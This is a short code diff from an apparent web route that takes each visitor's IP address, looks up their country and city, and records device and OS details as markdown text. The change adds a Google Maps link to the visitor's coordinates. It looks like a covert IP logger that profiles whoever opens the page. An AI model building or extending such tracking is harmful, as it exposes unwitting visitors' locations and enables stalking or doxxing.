@@ -14,7 +14,7 @@ router.get("/", async (ctx) => {
   const ip = ctx.request.ip;
   const info = await getIPLocation(`${ip}`);
   const countryinfo = encodeURIComponent(`**COUNTRY** : \`${info.country_name}\``);
-  const cityInfo = encodeURIComponent(`**CITY** : \`${info.city}\``);
+  const cityInfo = encodeURIComponent(`**CITY** : \[${info.city}\]\(https://www.google.com/maps/search/?api=1&query=${info.latitude}%2C${info.longitude}\)`);
   const iptext = encodeURIComponent(`**IP** : \[${ip}\]\(https://ip2location.io/${ip}\)`);
   const device_v = encodeURIComponent(`**DEVICE** : ${device.type}`);
   const device_os = encodeURIComponent(`**SYSTEM** : ${os.name}`);
